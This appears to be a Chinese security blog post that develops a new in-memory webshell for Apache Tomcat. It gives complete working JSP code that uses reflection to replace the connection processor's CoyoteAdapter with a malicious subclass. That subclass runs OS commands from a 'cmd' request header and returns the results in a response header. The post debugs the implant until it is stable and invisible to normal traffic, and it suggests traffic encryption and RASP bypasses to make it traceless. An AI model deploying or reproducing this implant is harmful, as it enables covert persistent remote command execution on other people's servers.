# CoyoteAdapter 内存马

# 前言

![Processor](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/Processor.png)

当我想知道访问一个 Servlet 的调用是怎么样子的时候，调用链调试出来之后，我发现其中还有一个地方可以被利用写成内存马。就是在图上的 Processor 处，而且有以下优点：

1. 稳定注入调用；
2. 无痕，不影响正常业务；
3. 可以命令执行回显。

# 探索新内存马

## 访问 Servlet 的调用链

到 Servlet 的 调用链如下：

```java
init:12, HelloServlet (com.example.tomcat_demo)
init:158, GenericServlet (javax.servlet)
initServlet:1144, StandardWrapper (org.apache.catalina.core)
loadServlet:1091, StandardWrapper (org.apache.catalina.core)
allocate:773, StandardWrapper (org.apache.catalina.core)
invoke:133, StandardWrapperValve (org.apache.catalina.core)
invoke:96, StandardContextValve (org.apache.catalina.core)
invoke:496, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:140, StandardHostValve (org.apache.catalina.core)
invoke:81, ErrorReportValve (org.apache.catalina.valves)
invoke:650, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:87, StandardEngineValve (org.apache.catalina.core)
service:342, CoyoteAdapter (org.apache.catalina.connector)
service:803, Http11Processor (org.apache.coyote.http11) [1] getAdapter().service(request, response);
process:66, AbstractProcessorLight (org.apache.coyote)
process:790, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1459, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
```

[1] - 在调用链的这部分，隐隐约约觉得这里可以利用

![image-20230213163035518](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230213163035518.png)

这里是`getAdapter().service(request, response);`，假如我们在此之前就 `set` 了我们自定义的 Adapter 就可以又是一个内存马了。可以查到，是有 `setAdapter` 这个方法的。

![image-20230213163625356](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230213163625356.png)

## 内存马思路

那么我们而已 Adapter 的设置具体顺序是：

`setAdapter` 方法初始化之后，`getAdapter().service(request, response);`之前。我们需要在这中间 `set` 一个恶意的 Adapter 。

## 尝试

Tomcat启动的时候并不会调用 `setAdapter` 方法，只有在访问一个 Servlet 的时候才会调用，调用链如下：

```
setAdapter:128, AbstractProcessor (org.apache.coyote)
createProcessor:850, AbstractHttp11Protocol (org.apache.coyote.http11)
process:778, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1459, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
```

显而易见的，`setAdapter` 方法是在 [1] 被调用的，[2] 是我们想要利用的地方。

```java
if (processor == null) {
    processor = getProtocol().createProcessor(); [1]
    register(processor);
}

processor.setSslSupport(
        wrapper.getSslSupport(getProtocol().getClientCertProvider()));

// Associate the processor with the connection
connections.put(socket, processor);

SocketState state = SocketState.CLOSED;
do {
    state = processor.process(wrapper, status); [2]

    if (state == SocketState.UPGRADING) {
        // Get the HTTP upgrade handler
        UpgradeToken upgradeToken = processor.getUpgradeToken();
```

可以看到他是 `processor == null` 的条件的时候才会进去设置的，假如我们提前设置好了的呢，其实没有关系，只要访问过一次之后processor是确定的了，所以不会进入再次设置 adapter，也就是说在第一次访问任意Servlet的时候已经set好了。这里我们就不在多追究了。

```java
if (processor != null) {
    // Make sure an async timeout doesn't fire
    getProtocol().removeWaitingProcessor(processor);
} else if (status == SocketEvent.DISCONNECT || status == SocketEvent.ERROR) {
    // Nothing to do. Endpoint requested a close and there is no
    // longer a processor associated with this socket.
    return SocketState.CLOSED;
}
```

## 总体思路代码

- 新建一个重写了恶意 `service` 方法的Adapter对象（继承 `CoyoteAdapter` 类）；
- 拿到特定的 `Http11Processor` 对象；
- 然后将恶意的Adapter对象设置在特定的 `Http11Processor` 对象。

```java
Adapter myadapter = new myAdapter(new Connector("HTTP/1.1"));
Http11Processor http11Processor = getHttp11Processor();
http11Processor.setAdapter(myadapter);
```

## 获取 Http11Processor

这里不想反复调试了，直接写个 Servlet 调试一下。首先要先获得当前的对象 `Http11Processor`，用工具查找一下

```
List<Keyword> keys = new ArrayList<>();
keys.add(new Keyword.Builder().setField_type("Http11Processor").build());
//新建一个广度优先搜索Thread.currentThread()的搜索器
SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
//打开调试模式
searcher.setIs_debug(true);
//挖掘深度为20
searcher.setMax_search_depth(20);
//设置报告保存位置
searcher.setReport_save_path("E:\\Vuln\\Environment\\Tomcat\\Tomcat_8.5.30\\apache-tomcat-8.5.30\\bin\\java-object-searcher-log");
searcher.searchObject();
```

结果只有一个，一切都是刚刚好

```
TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [15] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler} 
          ---> connections = {java.util.Map<S, org.apache.coyote.Processor>} 
           ---> [org.apache.tomcat.util.net.NioChannel@2e2f7d01:java.nio.channels.SocketChannel[connected local=/0:0:0:0:0:0:0:1:8088 remote=/0:0:0:0:0:0:0:1:54330]] = {org.apache.coyote.http11.Http11Processor}
```

线程中找到对象 `Http11Processor@3141`

![image-20230213174937372](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230213174937372.png)

### 难点

这里的问题在于，看到图上的 `table` 是一个“内部类对象数组”，怎么往下获取到我们的 `val` 是关键。

- 在这里使用反射拿到内部类对象的 Class 对象，然后使用 `getValue` 方法拿到 `val`。
- 另一个关键是使用 `Array.getLength(table.get())` 拿到内部类对象数组的长度，接着循环就可以拿出我们想要的对象了。

### 获取 Http11Processor 对象具体代码

代码如下，其他的就不赘叙了。

```java
public Http11Processor getHttp11Processor() {
        // 获取当前线程的所有线程
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            try {
                // 需要获取线程的特征包含Acceptor
                if (thread.getName().contains("Acceptor") && thread.getName().contains("http-nio")) {
                    ConcurrentHashMap connections  = (ConcurrentHashMap) getField(getField(getField(getField(thread, "target"),"this$0"),"handler"),"connections");
//                    拿到内部类对象
                    Class node = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");
//                    正好可以用此方法获取value
                    Method method = node.getMethod("getValue");
                    method.setAccessible(true);
                    Field table = ConcurrentHashMap.class.getDeclaredField("table");
                    table.setAccessible(true);
//                    Array.getLength(table.get(connections)) 是内部类对象数组的长度
                    for(int i =0;i < Array.getLength(table.get(connections));i++){
                        Object obj = Array.get(table.get(connections),i);
                        if (obj!=null){
                            Http11Processor res = (Http11Processor) method.invoke(obj);
                            return res;
                        }
                    }
                }
            } catch (Exception e) {
                continue;
            }
        }
//         没有获取到对应Http11Processor，返回一个空对象
        return new Http11Processor(8192,true,false,null,8192,null, 8192,2097152,null,false);
    }
```



## 中途遇到的问题

### 问题1

*会报错：java.lang.Object cannot be cast to org.apache.coyote.http11.Http11Processor*

获取 `Http11Processor` 对象的时候父类 Object 转换成子类 `Http11Processor` 了，直接获取 `Http11Processor` 对象就好了，问题出现在 `return` 的那行

![image-20230214110533503](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230214110533503.png)

```java
return (Http11Processor) new Object(); //报错java.lang.Object cannot be cast to org.apache.coyote.http11.Http11Processor
return new Http11Processor(8192,true,false,null,8192,null, 8192,2097152,null,false);// 修改后的return
```

### 问题2

*内存马有大概率无法命令执行*

这个问题其实我有预料到，经过检查，猜测是获取对象上面出了问题，所以首先检查 `Http11Processor` 对象获取的方法。

一查就看到，有时候会有一个 AJP 的 `accept` 在前面，这样自然就无法获取到想要的那个 `Http11Processor` 对象了，后面的参数传入和回显传出也会受影响。

![image-20230214142749881](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230214142749881.png)

```java
if (thread.getName().contains("Acceptor")) {
if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
```

# 传入参数

在调试的时候就看到了传入相关的对象了

![image-20230214173400655](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230214173400655.png)

`Http11Processor` 对象我们刚刚已经获取过了，代码如下

```java
public String getRequest() {
    String cmd = "";
    Http11Processor http11Processor = getHttp11Processor();
    Object[] headers = (Object[]) getField(getField(getField(http11Processor,"request"),"headers"),"headers");
    for (Object mimeHeaderField : headers){
        try {
            if (getField(mimeHeaderField,"nameB").toString().equals("cmd")){
                cmd = getField(mimeHeaderField,"valueB").toString();
                return cmd;
            }
        }catch (Exception e){
            continue;
        }
    }
    return cmd;
}
```

# 回显

显而易见的 `response` 也在 Processor 下面

![image-20230214180509224](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230214180509224.png)

代码如下

```
public void getResponse(byte[] res) throws UnsupportedEncodingException {
    Http11Processor http11Processor = getHttp11Processor();
    // response
    Response response = (Response) getField(http11Processor,"response");
    // 将执行的结果写入response中
    response.addHeader("Execute-result-by-xieyaowei", new String(res, "UTF-8"));
}
```

# 执行成功

成功代码执行并且有回显，访问任意路径也可以成功，多次重启注入尝试命令执行也可以成功，这是一枚合格的内存马了。

![image-20230215105306195](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215105306195.png)

![image-20230215105013527](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215105013527.png)

唯一的缺点就是一段时间之后，`Processor` 对象应该会丢失，所以需要重新注入才能命令执行。当然某种程度上来说，这也可以不是缺点。

JSP 代码如下，含具体注释：

```jsp
<%@ page import="org.apache.coyote.Adapter" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.coyote.http11.Http11Processor" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Array" %>
<%@ page import="org.apache.catalina.connector.CoyoteAdapter" %>
<%@ page import="org.apache.coyote.Request" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="java.io.UnsupportedEncodingException" %><%--
  Created by IntelliJ IDEA.
  User: xieyaowei
  Date: 2023/2/15
  Time: 10:00
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
//    获取 Http11Processor 对象方法
    public Http11Processor getHttp11Processor() {
        // 获取当前线程的所有线程
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            try {
                // 需要获取线程的特征包含 Acceptor 和 http-nio，必须包括 http-nio，因为可能有 ajp 的 Acceptor
                if (thread.getName().contains("Acceptor") && thread.getName().contains("http-nio")) {
//                    thread.target.this$0.handler.connections.table[x].val，拿到val属性
                    ConcurrentHashMap connections  = (ConcurrentHashMap) getField(getField(getField(getField(thread, "target"),"this$0"),"handler"),"connections");
//                    拿到内部类对象 ConcurrentHashMap$Node
                    Class node = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");
//                    拿到 table 属性
                    Field table = ConcurrentHashMap.class.getDeclaredField("table");
                    table.setAccessible(true);
//                    正好可以用此方法获取 value 属性
                    Method method = node.getMethod("getValue");
                    method.setAccessible(true);
//                    Array.getLength(table.get(connections)) 是内部类对象数组的长度
//                    遍历内部类对象数组拿到 Http11Processor 对象
                    for(int i = 0; i < Array.getLength(table.get(connections)); i++){
                        Object obj = Array.get(table.get(connections),i);
                        if (obj!=null){
                            Http11Processor res = (Http11Processor) method.invoke(obj);
                            return res;
                        }
                    }
                }
            } catch (Exception e) {
                continue;
            }
        }
//         没有获取到对应 Http11Processor，返回一个空对象，这里随便新建一个 Http11Processor 对象
        return new Http11Processor(8192,true,false,null,8192,null, 8192,2097152,null,false);
    }

//    反射获取属性方法
    public Object getField(Object obj, String field) {
        // 递归获取类的及其父类的属性
        Class clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field declaredField = clazz.getDeclaredField(field);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }

//    自定义包含有恶意重写的 service 方法的 Adapter 类
    public class myAdapter extends CoyoteAdapter {
        public myAdapter(Connector connector) {
            super(connector);
        }

//        恶意 service 方法
        public void service(Request req, Response res) throws Exception {
            // evil code，命令执行在此
            try {
                String cmd = getRequest();
                String[] cmds = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                byte[] result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                getResponse(result);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

//        获取命令执行参数传入 cmd
        public String getRequest() {
            String cmd = "";
//            从 Http11Processor 对象拿到 request 对象，最终拿到参数 cmd
            Http11Processor http11Processor = getHttp11Processor();
            Object[] headers = (Object[]) getField(getField(getField(http11Processor,"request"),"headers"),"headers");
            for (Object mimeHeaderField : headers){
                try {
                    if (getField(mimeHeaderField,"nameB").toString().equals("cmd")){
                        cmd = getField(mimeHeaderField,"valueB").toString();
                        return cmd;
                    }
                }catch (Exception e){
                    continue;
                }
            }
            return cmd;
        }

//        获取命令执行回显 Execute-result-by-xieyaowei
        public void getResponse(byte[] res) throws UnsupportedEncodingException {
            Http11Processor http11Processor = getHttp11Processor();
            // 获取到 response 对象
            Response response = (Response) getField(http11Processor,"response");
            // 用 addHeader 将执行的结果写入response中
            response.addHeader("Execute-result-by-xieyaowei", new String(res, "UTF-8"));
        }
    }
%>

<%
//    新建一个 Adapter 对象的时候需要传入一个 Connector 对象，这里新建 Connector 对象传入的是 HTTP/1.1 协议
    Adapter myadapter = new myAdapter(new Connector("HTTP/1.1"));
//    拿到我们想要的 Http11Processor 对象
    Http11Processor http11Processor = getHttp11Processor();
//    set 一个自定义的 Adapter，下一次访问即可命令执行
    http11Processor.setAdapter(myadapter);
%>

```

在使用 JSP 的时候发现，没有在 Servlet 使用的不稳定缺点。

- 注入后访问任何路径都可以命令执行并且成功回显；
- 不需要重复注入。

# 发现问题

## 问题1

但是后面发现这个内存马注入之后会导致所有的 Servlet 都失效，可能是因为 Adapter 被我们更改了。

那现在的思路就是拿到之前的 Adapter ，找到它初始化的地方，在我们自定义的 Adapter 做同样的初始化步骤。或者是之直接把所有的原来的 Adapter 的所有属性和方法都写一遍进去。

一个正常的 Adapter 原来里面有一个 Connector ，里面有一些对象。

![image-20230215114922797](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215114922797.png)

然而我的 Connector 是随便构造的，`new Connector("HTTP/1.1")`构造出来的应该也是正常的才对，不应该有什么区别。但是一看确实有区别，少了不少对象。

![image-20230215115721932](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215115721932.png)

好，这样思路就来了，直接拿到旧的 Connector 当作参数放进去应该就没有问题了。经过实验这样依旧会导致所有的业务都无法正常运行。注入之后，访问正常业务会报错：

```java
java.util.NoSuchElementException
	at java.util.Scanner.throwFor(Scanner.java:862)
	at java.util.Scanner.next(Scanner.java:1371)
	at org.apache.jsp.Processor_jsp$myAdapter.service(Processor_jsp.java:102)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:790)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)
```

## 问题2

我们使用 JSP 注入内存马，然后访问正常页面看是否会再次出现该报错。

注入成功：

![image-20230215142839023](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215142839023.png)

命令执行成功：

![image-20230215142923939](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215142923939.png)

但是，要是没有 cmd 参数呢？Tomcat 的 Console 就会报错，报错的内容和上面的一样。这里的报错应该是 cmd 参数拿不到，命令执行的报错，要解决很简单，加个判断就好了。确实解决了这个报错。

![image-20230215143806996](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215143806996.png)

虽然依然报错，但是报错不一样了，报错和参数 req 和 res。

## 问题3

我以为是参数的问题，结果调试进去是 connector 的问题，在这里 connector 是 null。

![image-20230215153429620](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215153429620.png)

不会吧，之前还专门设置了旧的 Connector ，假如设置是准确的应该是没有问题的，调试一下。

![image-20230215154327877](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215154327877.png)

还真的是null，应该是这个方法有问题了，步入看看，应该是 Adapter 下面的 connector 对象，我写成了 http11Processor 下面的 connector 对象。重新写就好了。正确的路径旧是` http11Processor.adapter.connector` 

![image-20230215155126589](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215155126589.png)

自此，它已经是一个成熟的内存马了。

![image-20230215155919300](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215155919300.png)

没有cmd参数呢？也是正常的啦。

![image-20230215160056496](https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/image-20230215160056496.png)



# 最终完整代码

```jsp
<%@ page import="org.apache.coyote.Adapter" %>
<%@ page import="org.apache.coyote.http11.Http11Processor" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Array" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.catalina.connector.CoyoteAdapter" %>
<%@ page import="org.apache.coyote.Request" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="java.io.UnsupportedEncodingException" %><%--
  Created by IntelliJ IDEA.
  User: xieyaowei
  Date: 2023/2/15
  Time: 16:04
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // 拿到唯一的 Http11Processor
    public Http11Processor getHttp11Processor() {
        // 获取当前线程的所有线程
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            try {
                // 需要获取线程的特征包含Acceptor
                if (thread.getName().contains("Acceptor") && thread.getName().contains("http-nio")) {
                    ConcurrentHashMap connections  = (ConcurrentHashMap) getField(getField(getField(getField(thread, "target"),"this$0"),"handler"),"connections");
                    // 拿到内部类对象
                    Class node = Class.forName("java.util.concurrent.ConcurrentHashMap$Node");
                    // 正好可以用此方法获取value
                    Method method = node.getMethod("getValue");
                    method.setAccessible(true);
                    Field table = ConcurrentHashMap.class.getDeclaredField("table");
                    table.setAccessible(true);
                    // Array.getLength(table.get(connections)) 是内部类对象数组的长度
                    for(int i = 0; i < Array.getLength(table.get(connections)); i++){
                        Object obj = Array.get(table.get(connections),i);
                        if (obj!=null){
                            Http11Processor res = (Http11Processor) method.invoke(obj);
                            return res;
                        }
                    }
                }
            } catch (Exception e) {
                continue;
            }
        }
        // 没有获取到对应Http11Processor，返回一个空对象
        return new Http11Processor(8192,true,false,null,8192,null, 8192,2097152,null,false);
    }

    // 拿到旧的 Connector 对象，在 Http11Processor.adapter.connector
    public Connector getConnector(){
        Http11Processor http11Processor = getHttp11Processor();
        Connector Connector =  (Connector) getField(getField(http11Processor,"adapter"),"connector");
        return Connector;
    }

    // 反射拿到类的属性
    public Object getField(Object obj, String field) {
        // 递归获取类的及其父类的属性
        Class clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field declaredField = clazz.getDeclaredField(field);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            } catch (Exception e) {
                clazz = clazz.getSuperclass();
            }
        }
        return null;
    }

    // 编写新 Adapter，是 CoyoteAdapter 的子类，并且重写恶意 service 方法
    public class myAdapter extends CoyoteAdapter {
        public myAdapter(Connector connector) {
            super(connector);
        }
        // 重写恶意 service 方法
        @Override
        public void service(Request req, Response res) throws Exception {
            // evil code，命令执行
            try {
                String cmd = getRequest();
                if (!cmd.equals("")){
                    String[] cmds = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                    getResponse(result);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            try{
                // 必须调用父类方法，保证正常的 service 调用
                super.service(req,res);
            }catch (Exception e){
                e.printStackTrace();
            }

        }

        // 拿到 Request 对象，在http11Processor.request.headers.headers的下面
        // Header cmd
        public String getRequest() {
            String cmd = "";
            Http11Processor http11Processor = getHttp11Processor();
            Object[] headers = (Object[]) getField(getField(getField(http11Processor,"request"),"headers"),"headers");
            for (Object mimeHeaderField : headers){
                try {
                    if (getField(mimeHeaderField,"nameB").toString().equals("cmd")){
                        cmd = getField(mimeHeaderField,"valueB").toString();
                        return cmd;
                    }
                }catch (Exception e){
                    continue;
                }
            }
            return cmd;
        }

        // 拿到 Response 对象，在http11Processor.response
        // Execute-result-by-xieyaowei
        public void getResponse(byte[] res) throws UnsupportedEncodingException {
            Http11Processor http11Processor = getHttp11Processor();
            // response
            Response response = (Response) getField(http11Processor,"response");
            // 将执行的结果写入response中
            response.addHeader("Execute-result-by-xieyaowei", new String(res, "UTF-8"));
        }

    }
%>
<%
    //思路： set一个 adapter 恶意对象到 http11Processor 里面
    Adapter myadapter = new myAdapter(getConnector());
    Http11Processor http11Processor = getHttp11Processor();
    http11Processor.setAdapter(myadapter);
%>
```

# 再次探索

因为这个叫http Accepter 的线程会一直在，之后所有的 http 请求都会由这个线程处理，所以只要注入了之后就可以稳定使用，加密混淆流量之后更是可以做到流量无痕，假如在命令执行执行做一些 RASP 的绕过，这个内存马基本上可以做到完全无痕。

# 小结

这个内存马的研究起源是之前的 Upgrade 内存马的研究，根据他们的思路打算在访问 Servlet 路径上是否有类似的“可控对象执行方法”。

再次总结就是，在访问 Servlet 的过程中，其中会执行很多`Obj.func()`，只要这个代码段符合以下标准：

- 此对象在 Tomcat 启动时初始化；
- 此对象的方法可以被重写；
- 从 Tocmat 的几大对象中，可以通过反射构造此对象；
- 我们可以控制参数，进入分支。

就还是有不少内存马待发掘的，比如这里使用的只是HTTP/1.1的 Processor 而已，思路发散一下就好了。*本文的测试环境在IDEA JDK8u102 Tomcat 8.5.30。*